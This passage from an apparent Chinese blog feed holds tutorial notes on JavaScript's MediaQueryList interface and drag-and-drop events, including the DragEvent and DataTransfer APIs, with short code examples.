<h5 id="9-11-2-MediaQueryList-接口的实例属性"><a href="#9-11-2-MediaQueryList-接口的实例属性" class="headerlink" title="9.11.2 MediaQueryList 接口的实例属性"></a>9.11.2 MediaQueryList 接口的实例属性</h5><p>MediaQueryList 实例有三个属性。</p>
<h6 id="（1）MediaQueryList-media"><a href="#（1）MediaQueryList-media" class="headerlink" title="（1）MediaQueryList.media"></a>（1）MediaQueryList.media</h6><p><code>MediaQueryList.media</code>属性返回一个字符串，表示对应的 MediaQuery 条件语句。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mql = <span class="built_in">window</span>.matchMedia(<span class="string">&#x27;(min-width: 400px)&#x27;</span>);</span><br><span class="line">mql.media <span class="comment">// &quot;(min-width: 400px)&quot;</span></span><br></pre></td></tr></table></figure>
<h6 id="（2）MediaQueryList-matches"><a href="#（2）MediaQueryList-matches" class="headerlink" title="（2）MediaQueryList.matches"></a>（2）MediaQueryList.matches</h6><p><code>MediaQueryList.matches</code>属性返回一个布尔值，表示当前页面是否符合指定的 MediaQuery 条件语句。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.matchMedia(<span class="string">&#x27;(min-width: 400px)&#x27;</span>).matches) &#123;</span><br><span class="line">  <span class="comment">/* 当前视口不小于 400 像素 */</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">/* 当前视口小于 400 像素 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面的例子根据<code>mediaQuery</code>是否匹配当前环境，加载相应的 CSS 样式表</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = <span class="built_in">window</span>.matchMedia(<span class="string">&quot;(max-width: 700px)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result.matches)&#123;</span><br><span class="line">  <span class="keyword">var</span> linkElm = <span class="built_in">document</span>.createElement(<span class="string">&#x27;link&#x27;</span>);</span><br><span class="line">  linkElm.setAttribute(<span class="string">&#x27;rel&#x27;</span>, <span class="string">&#x27;stylesheet&#x27;</span>);</span><br><span class="line">  linkElm.setAttribute(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/css&#x27;</span>);</span><br><span class="line">  linkElm.setAttribute(<span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;small.css&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">document</span>.head.appendChild(linkElm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="（3）MediaQueryList-onchange"><a href="#（3）MediaQueryList-onchange" class="headerlink" title="（3）MediaQueryList.onchange"></a>（3）MediaQueryList.onchange</h6><p>如果 MediaQuery 条件语句的适配环境发生变化，会触发<code>change</code>事件。<code>MediaQueryList.onchange</code>属性用来指定<code>change</code>事件的监听函数。该函数的参数是<code>change</code>事件对象（MediaQueryListEvent 实例），该对象与 MediaQueryList 实例类似，也有<code>media</code>和<code>matches</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mql = <span class="built_in">window</span>.matchMedia(<span class="string">&#x27;(max-width: 600px)&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mql.onchange = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e.matches) &#123;</span><br><span class="line">    <span class="comment">/* 视口不超过 600 像素 */</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 视口超过 600 像素 */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>change</code>事件发生后，存在两种可能。一种是显示宽度从600像素以上变为以下，另一种是从600像素以下变为以上，所以在监听函数内部要判断一下当前是哪一种情况。</p>
<h5 id="9-11-3-MediaQueryList-接口的实例方法"><a href="#9-11-3-MediaQueryList-接口的实例方法" class="headerlink" title="9.11.3 MediaQueryList 接口的实例方法"></a>9.11.3 MediaQueryList 接口的实例方法</h5><p>MediaQueryList 实例有两个方法<code>MediaQueryList.addListener()</code>和<code>MediaQueryList.removeListener()</code>，用来为<code>change</code>事件添加或撤销监听函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mql = <span class="built_in">window</span>.matchMedia(<span class="string">&#x27;(max-width: 600px)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定监听函数</span></span><br><span class="line">mql.addListener(mqCallback);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 撤销监听函数</span></span><br><span class="line">mql.removeListener(mqCallback);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mqCallback</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e.matches) &#123;</span><br><span class="line">    <span class="comment">/* 视口不超过 600 像素 */</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">/* 视口超过 600 像素 */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意，<code>MediaQueryList.removeListener()</code>方法不能撤销<code>MediaQueryList.onchange</code>属性指定的监听函数。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-CSS 操作</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0052</title>
    <url>/2021/05/29/%E6%89%93%E5%8D%A10052/</url>
    <content><![CDATA[<p><font color=#f47920>劝君更尽一杯酒，西出阳关无故人。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="9-拖拉事件"><a href="#9-拖拉事件" class="headerlink" title="9. 拖拉事件"></a>9. 拖拉事件</h3><h4 id="9-1-拖拉事件的种类"><a href="#9-1-拖拉事件的种类" class="headerlink" title="9.1 拖拉事件的种类"></a>9.1 拖拉事件的种类</h4><p>拖拉（drag）指的是，用户在某个对象上按下鼠标键不放，拖动它到另一个位置，然后释放鼠标键，将该对象放在那里。</p>
<p>拖拉的对象有好几种，包括元素节点、图片、链接、选中的文字等等。在网页中，除了元素节点默认不可以拖拉，其他（图片、链接、选中的文字）都可以直接拖拉。为了让元素节点可拖拉，可以将该节点的<code>draggable</code>属性设为<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div draggable=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">  此区域可拖拉</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码的<code>div</code>区块，在网页中可以直接用鼠标拖动。松开鼠标键时，拖动效果就会消失，该区块依然在原来的位置。</p>
<p><code>draggable</code>属性可用于任何元素节点，但是图片（<code>&lt;img&gt;</code>）和链接（<code>&lt;a&gt;</code>）不加这个属性，就可以拖拉。对于它们，用到这个属性的时候，往往是将其设为<code>false</code>，防止拖拉这两种元素。</p>
<p>注意，一旦某个元素节点的<code>draggable</code>属性设为<code>true</code>，就无法再用鼠标选中该节点内部的文字或子节点了。</p>
<span id="more"></span>
<p>当元素节点或选中的文本被拖拉时，就会持续触发拖拉事件，包括以下一些事件。</p>
<ul>
<li><code>drag</code>：拖拉过程中，在被拖拉的节点上持续触发（相隔几百毫秒）。</li>
<li><code>dragstart</code>：用户开始拖拉时，在被拖拉的节点上触发，该事件的<code>target</code>属性是被拖拉的节点。通常应该在这个事件的监听函数中，指定拖拉的数据。</li>
<li><code>dragend</code>：拖拉结束时（释放鼠标键或按下 ESC 键）在被拖拉的节点上触发，该事件的<code>target</code>属性是被拖拉的节点。它与<code>dragstart</code>事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消，<code>dragend</code>事件总是会触发的。</li>
<li><code>dragenter</code>：拖拉进入当前节点时，在当前节点上触发一次，该事件的<code>target</code>属性是当前节点。通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。</li>
<li><code>dragover</code>：拖拉到当前节点上方时，在当前节点上持续触发（相隔几百毫秒），该事件的<code>target</code>属性是当前节点。该事件与<code>dragenter</code>事件的区别是，<code>dragenter</code>事件在进入该节点时触发，然后只要没有离开这个节点，<code>dragover</code>事件会持续触发。</li>
<li><code>dragleave</code>：拖拉操作离开当前节点范围时，在当前节点上触发，该事件的<code>target</code>属性是当前节点。如果要在视觉上显示拖拉离开操作当前节点，就在这个事件的监听函数中设置。</li>
<li><code>drop</code>：被拖拉的节点或选中的文本，释放到目标节点时，在目标节点上触发。注意，如果当前节点不允许<code>drop</code>，即使在该节点上方松开鼠标键，也不会触发该事件。如果用户按下 ESC 键，取消这个操作，也不会触发该事件。该事件的监听函数负责取出拖拉数据，并进行相关处理。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.addEventListener(<span class="string">&#x27;dragstart&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.style.backgroundColor = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">div.addEventListener(<span class="string">&#x27;dragend&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">this</span>.style.backgroundColor = <span class="string">&#x27;green&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>div</code>节点被拖动时，背景色会变为红色，拖动结束，又变回绿色。</p>
<p>下面是一个例子，展示如何实现将一个节点从当前父节点，拖拉到另一个父节点中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment"> &lt;div class=&quot;dropzone&quot;&gt;</span></span><br><span class="line"><span class="comment">   &lt;div id=&quot;draggable&quot; draggable=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="comment">     该节点可拖拉</span></span><br><span class="line"><span class="comment">   &lt;/div&gt;</span></span><br><span class="line"><span class="comment"> &lt;/div&gt;</span></span><br><span class="line"><span class="comment"> &lt;div class=&quot;dropzone&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment"> &lt;div class=&quot;dropzone&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment"> &lt;div class=&quot;dropzone&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 被拖拉节点</span></span><br><span class="line"><span class="keyword">var</span> dragged;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;dragstart&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 保存被拖拉节点</span></span><br><span class="line">  dragged = event.target;</span><br><span class="line">  <span class="comment">// 被拖拉节点的背景色变透明</span></span><br><span class="line">  event.target.style.opacity = <span class="number">0.5</span>;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;dragend&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 被拖拉节点的背景色恢复正常</span></span><br><span class="line">  event.target.style.opacity = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;dragover&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 防止拖拉效果被重置，允许被拖拉的节点放入目标节点</span></span><br><span class="line">  event.preventDefault();</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;dragenter&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 目标节点的背景色变紫色</span></span><br><span class="line">  <span class="comment">// 由于该事件会冒泡，所以要过滤节点</span></span><br><span class="line">  <span class="keyword">if</span> (event.target.className === <span class="string">&#x27;dropzone&#x27;</span>) &#123;</span><br><span class="line">    event.target.style.background = <span class="string">&#x27;purple&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;dragleave&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> event </span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 目标节点的背景色恢复原样</span></span><br><span class="line">  <span class="keyword">if</span> (event.target.className === <span class="string">&#x27;dropzone&#x27;</span>) &#123;</span><br><span class="line">    event.target.style.background = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;drop&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> event </span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 防止事件默认行为（比如某些元素节点上可以打开链接），</span></span><br><span class="line">  event.preventDefault();</span><br><span class="line">  <span class="keyword">if</span> (event.target.className === <span class="string">&#x27;dropzone&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">// 恢复目标节点背景色</span></span><br><span class="line">    event.target.style.background = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="comment">// 将被拖拉节点插入目标节点</span></span><br><span class="line">    dragged.parentNode.removeChild(dragged);</span><br><span class="line">    event.target.appendChild( dragged );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>关于拖拉事件，有以下几个注意点。</p>
<ul>
<li>拖拉过程只触发以上这些拖拉事件，尽管鼠标在移动，但是鼠标事件不会触发。</li>
<li>将文件从操作系统拖拉进浏览器，不会触发<code>dragstart</code>和<code>dragend</code>事件。</li>
<li><code>dragenter</code>和<code>dragover</code>事件的监听函数，用来取出拖拉的数据（即允许放下被拖拉的元素）。由于网页的大部分区域不适合作为放下拖拉元素的目标节点，所以这两个事件的默认设置为当前节点不允许接受被拖拉的元素。如果想要在目标节点上放下的数据，首先必须阻止这两个事件的默认行为。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div ondragover=<span class="string">&quot;return false&quot;</span>&gt;</span><br><span class="line">&lt;div ondragover=<span class="string">&quot;event.preventDefault()&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，如果不取消拖拉事件或者阻止默认行为，就不能在div节点上放下被拖拉的节点。</p>
<h4 id="9-2-DragEvent-接口"><a href="#9-2-DragEvent-接口" class="headerlink" title="9.2 DragEvent 接口"></a>9.2 DragEvent 接口</h4><p>拖拉事件都继承了<code>DragEvent</code>接口，这个接口又继承了<code>MouseEvent</code>接口和<code>Event</code>接口。</p>
<p>浏览器原生提供一个<code>DragEvent()</code>构造函数，用来生成拖拉事件的实例对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> DragEvent(type, options)</span><br></pre></td></tr></table></figure>
<p><code>DragEvent()</code>构造函数接受两个参数，第一个参数是字符串，表示事件的类型，该参数必须；第二个参数是事件的配置对象，用来设置事件的属性，该参数可选。配置对象除了接受<code>MouseEvent</code>接口和<code>Event</code>接口的配置属性，还可以设置<code>dataTransfer</code>属性要么是<code>null</code>，要么是一个<code>DataTransfer</code>接口的实例。</p>
<p><code>DataTransfer</code>的实例对象用来读写拖拉事件中传输的数据，详见下文《DataTransfer 接口》的部分。</p>
<h4 id="9-3-DataTransfer-接口概述"><a href="#9-3-DataTransfer-接口概述" class="headerlink" title="9.3 DataTransfer 接口概述"></a>9.3 DataTransfer 接口概述</h4><p>所有拖拉事件的实例都有一个<code>DragEvent.dataTransfer</code>属性，用来读写需要传递的数据。这个属性的值是一个<code>DataTransfer</code>接口的实例。</p>
<p>浏览器原生提供一个<code>DataTransfer()</code>构造函数，用来生成<code>DataTransfer</code>实例对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> dataTrans = <span class="keyword">new</span> DataTransfer();</span><br></pre></td></tr></table></figure>
<p><code>DataTransfer()</code>构造函数不接受参数。</p>
<p>拖拉的数据分成两方面：数据的种类（又称格式）和数据的值。数据的种类是一个 MIME 字符串（比如<code>text/plain</code>、<code>image/jpeg</code>），数据的值是一个字符串。一般来说，如果拖拉一段文本，则数据默认就是那段文本；如果拖拉一个链接，则数据默认就是链接的 URL。</p>
<p>拖拉事件开始时，开发者可以提供数据类型和数据值。拖拉过程中，开发者通过<code>dragenter</code>和<code>dragover</code>事件的监听函数，检查数据类型，以确定是否允许放下（drop）被拖拉的对象。比如，在只允许放下链接的区域，检查拖拉的数据类型是否为<code>text/uri-list</code>。</p>
<p>发生<code>drop</code>事件时，监听函数取出拖拉的数据，对其进行处理。</p>
<h4 id="9-4-DataTransfer-的实例属性"><a href="#9-4-DataTransfer-的实例属性" class="headerlink" title="9.4 DataTransfer 的实例属性"></a>9.4 DataTransfer 的实例属性</h4><h5 id="9-4-1-DataTransfer-dropEffect"><a href="#9-4-1-DataTransfer-dropEffect" class="headerlink" title="9.4.1 DataTransfer.dropEffect"></a>9.4.1 DataTransfer.dropEffect</h5><p><code>DataTransfer.dropEffect</code>属性用来设置放下（drop）被拖拉节点时的效果，会影响到拖拉经过相关区域时鼠标的形状。它可能取下面的值。</p>
<ul>
<li>copy：复制被拖拉的节点</li>
<li>move：移动被拖拉的节点</li>
<li>link：创建指向被拖拉的节点的链接</li>
<li>none：无法放下被拖拉的节点</li>
</ul>
<p>除了上面这些值，设置其他的值都是无效的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">target.addEventListener(<span class="string">&#x27;dragover&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  e.preventDefault();</span><br><span class="line">  e.stopPropagation();</span><br><span class="line">  e.dataTransfer.dropEffect = <span class="string">&#x27;copy&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码中，被拖拉元素一旦<code>drop</code>，接受的区域会复制该节点。</p>
<p><code>dropEffect</code>属性一般在<code>dragenter</code>和<code>dragover</code>事件的监听函数中设置，对于<code>dragstart</code>、<code>drag</code>、<code>dragleave</code>这三个事件，该属性不起作用。因为该属性只对接受被拖拉的节点的区域有效，对被拖拉的节点本身是无效的。进入目标区域后，拖拉行为会初始化成设定的效果。</p>
<h5 id="9-4-2-DataTransfer-effectAllowed"><a href="#9-4-2-DataTransfer-effectAllowed" class="headerlink" title="9.4.2 DataTransfer.effectAllowed"></a>9.4.2 DataTransfer.effectAllowed</h5><p><code>DataTransfer.effectAllowed</code>属性设置本次拖拉中允许的效果。它可能取下面的值。</p>
<ul>
<li>copy：复制被拖拉的节点</li>
<li>move：移动被拖拉的节点</li>
<li>link：创建指向被拖拉节点的链接</li>
<li>copyLink：允许<code>copy</code>或<code>link</code></li>
<li>copyMove：允许<code>copy</code>或<code>move</code></li>
<li>linkMove：允许<code>link</code>或<code>move</code></li>
<li>all：允许所有效果</li>
<li>none：无法放下被拖拉的节点</li>
<li>uninitialized：默认值，等同于<code>all</code></li>
</ul>
<p>如果某种效果是不允许的，用户就无法在目标节点中达成这种效果。</p>
<p>这个属性与<code>dropEffect</code>属性是同一件事的两个方面。前者设置被拖拉的节点允许的效果，后者设置接受拖拉的区域的效果，它们往往配合使用。</p>
<p><code>dragstart</code>事件的监听函数，可以用来设置这个属性。其他事件的监听函数里面设置这个属性是无效的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">source.addEventListener(<span class="string">&#x27;dragstart&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  e.dataTransfer.effectAllowed = <span class="string">&#x27;move&#x27;</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">target.addEventListener(<span class="string">&#x27;dragover&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  e.dataTransfer.dropEffect = <span class="string">&#x27;move&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>只要<code>dropEffect</code>属性和<code>effectAllowed</code>属性之中，有一个为<code>none</code>，就无法在目标节点上完成<code>drop</code>操作。</p>
<h5 id="9-4-3-DataTransfer-files"><a href="#9-4-3-DataTransfer-files" class="headerlink" title="9.4.3 DataTransfer.files"></a>9.4.3 DataTransfer.files</h5><p><code>DataTransfer.files</code>属性是一个 FileList 对象，包含一组本地文件，可以用来在拖拉操作中传送。如果本次拖拉不涉及文件，则该属性为空的 FileList 对象。</p>
<p>下面就是一个接收拖拉文件的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;output&quot; style=&quot;min-height: 200px;border: 1px solid black;&quot;&gt;</span></span><br><span class="line"><span class="comment">//   文件拖拉到这里</span></span><br><span class="line"><span class="comment">// &lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;output&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.addEventListener(<span class="string">&quot;dragenter&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> event </span>) </span>&#123;</span><br><span class="line">  div.textContent = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">  event.preventDefault();</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">div.addEventListener(<span class="string">&quot;dragover&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> event </span>) </span>&#123;</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">  event.preventDefault();</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">div.addEventListener(<span class="string">&quot;drop&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"> event </span>) </span>&#123;</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">  event.preventDefault();</span><br><span class="line">  <span class="keyword">var</span> files = event.dataTransfer.files;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">    div.textContent += files[i].name + <span class="string">&#x27; &#x27;</span> + files[i].size + <span class="string">&#x27;字节\n&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码中，通过<code>dataTransfer.files</code>属性读取被拖拉的文件的信息。如果想要读取文件内容，就要使用<code>FileReader</code>对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.addEventListener(<span class="string">&#x27;drop&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  e.preventDefault();</span><br><span class="line">  e.stopPropagation();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> fileList = e.dataTransfer.files;</span><br><span class="line">  <span class="keyword">if</span> (fileList.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = fileList[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">    reader.onloadend = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (e.target.readyState === FileReader.DONE) &#123;</span><br><span class="line">        <span class="keyword">var</span> content = reader.result;</span><br><span class="line">        div.innerHTML = <span class="string">&#x27;File: &#x27;</span> + file.name + <span class="string">&#x27;\n\n&#x27;</span> + content;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    reader.readAsBinaryString(file);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h5 id="9-4-4-DataTransfer-types"><a href="#9-4-4-DataTransfer-types" class="headerlink" title="9.4.4 DataTransfer.types"></a>9.4.4 DataTransfer.types</h5><p><code>DataTransfer.types</code>属性是一个只读的数组，每个成员是一个字符串，里面是拖拉的数据格式（通常是 MIME 值）。比如，如果拖拉的是文字，对应的成员就是<code>text/plain</code>。</p>
<p>下面是一个例子，通过检查<code>dataTransfer</code>属性的类型，决定是否允许在当前节点执行<code>drop</code>操作。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">contains</span>(<span class="params">list, value</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span>(list[i] === value) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doDragOver</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> isLink = contains(event.dataTransfer.types, <span class="string">&#x27;text/uri-list&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (isLink) event.preventDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，只有当被拖拉的节点有一个是链接时，才允许在当前节点放下。</p>
<h5 id="9-4-5-DataTransfer-items"><a href="#9-4-5-DataTransfer-items" class="headerlink" title="9.4.5 DataTransfer.items"></a>9.4.5 DataTransfer.items</h5><p><code>DataTransfer.items</code>属性返回一个类似数组的只读对象（DataTransferItemList 实例），每个成员就是本次拖拉的一个对象（DataTransferItem 实例）。如果本次拖拉不包含对象，则返回一个空对象。</p>
<p>DataTransferItemList 实例具有以下的属性和方法。</p>
<ul>
<li><code>length</code>：返回成员的数量</li>
<li><code>add(data, type)</code>：增加一个指定内容和类型（比如<code>text/html</code>和<code>text/plain</code>）的字符串作为成员</li>
<li><code>add(file)</code>：<code>add</code>方法的另一种用法，增加一个文件作为成员</li>
<li><code>remove(index)</code>：移除指定位置的成员</li>
<li><code>clear()</code>：移除所有的成员</li>
</ul>
<p>DataTransferItem 实例具有以下的属性和方法。</p>
<ul>
<li><code>kind</code>：返回成员的种类（<code>string</code>还是<code>file</code>）。</li>
<li><code>type</code>：返回成员的类型（通常是 MIME 值）。</li>
<li><code>getAsFile()</code>：如果被拖拉是文件，返回该文件，否则返回<code>null</code>。</li>
<li><code>getAsString(callback)</code>：如果被拖拉的是字符串，将该字符传入指定的回调函数处理。该方法是异步的，所以需要传入回调函数。</li>
</ul>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">div.addEventListener(<span class="string">&#x27;drop&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  e.preventDefault();</span><br><span class="line">  <span class="keyword">if</span> (e.dataTransfer.items != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; e.dataTransfer.items.length; i++) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(e.dataTransfer.items[i].kind + <span class="string">&#x27;: &#x27;</span> + e.dataTransfer.items[i].type);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="9-5-DataTransfer-的实例方法"><a href="#9-5-DataTransfer-的实例方法" class="headerlink" title="9.5 DataTransfer 的实例方法"></a>9.5 DataTransfer 的实例方法</h4><h5 id="9-5-1-DataTransfer-setData"><a href="#9-5-1-DataTransfer-setData" class="headerlink" title="9.5.1 DataTransfer.setData()"></a>9.5.1 DataTransfer.setData()</h5><p><code>DataTransfer.setData()</code>方法用来设置拖拉事件所带有的数据。该方法没有返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">event.dataTransfer.setData(<span class="string">&#x27;text/plain&#x27;</span>, <span class="string">&#x27;Text to drag&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码为当前的拖拉事件加入纯文本数据。</p>
<p>该方法接受两个参数，都是字符串。第一个参数表示数据类型（比如<code>text/plain</code>），第二个参数是具体数据。如果指定类型的数据在<code>dataTransfer</code>属性不存在，那么这些数据将被加入，否则原有的数据将被新数据替换。</p>
<p>如果是拖拉文本框或者拖拉选中的文本，会默认将对应的文本数据，添加到<code>dataTransfer</code>属性，不用手动指定。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div draggable=<span class="string">&quot;true&quot;</span>&gt;</span><br><span class="line">  aaa</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码中，拖拉这个<code>&lt;div&gt;</code>元素会自动带上文本数据<code>aaa</code>。</p>
<p>使用<code>setData</code>方法，可以替换到原有数据。</p>
